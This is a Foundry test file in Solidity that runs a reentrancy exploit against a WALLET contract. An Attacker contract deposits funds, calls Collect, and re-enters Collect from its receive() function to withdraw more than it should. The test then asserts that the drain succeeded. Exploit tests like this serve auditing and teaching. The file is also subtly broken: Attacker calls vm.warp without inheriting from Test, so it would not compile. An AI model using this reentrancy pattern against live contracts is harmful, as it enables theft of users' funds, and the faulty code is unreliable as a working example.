
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET} from "../src/WALLET.sol";
import {Log} from "../src/WALLET.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyWALLET is Test {
    using stdStorage for StdStorage;

    WALLET public _wallet;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _wallet = new WALLET(address(_log));
        _attacker = new Attacker(address(_wallet));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        vm.assume(attackVal <= 1000 ether);

        uint256 initialDeposit = attackVal * 2;

        vm.deal(address(_wallet), initialDeposit);
        vm.deal(address(_attacker), initialDeposit);
        vm.deal(address(this), initialDeposit);

        _attacker.setupAttack{value: initialDeposit}(attackVal, initialDeposit);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public wallet;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        wallet = WALLET(victimAddress);
    }

    function setupAttack(uint256 val, uint256 depositAmount) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        wallet.Put{value: depositAmount}(0);
        
        vm.warp(block.timestamp + 1);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        wallet.Collect(val);
        
        uint256 finalBalance = address(this).balance;
        if (finalBalance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            wallet.Collect(storedAttackVal);
        }
    }
}
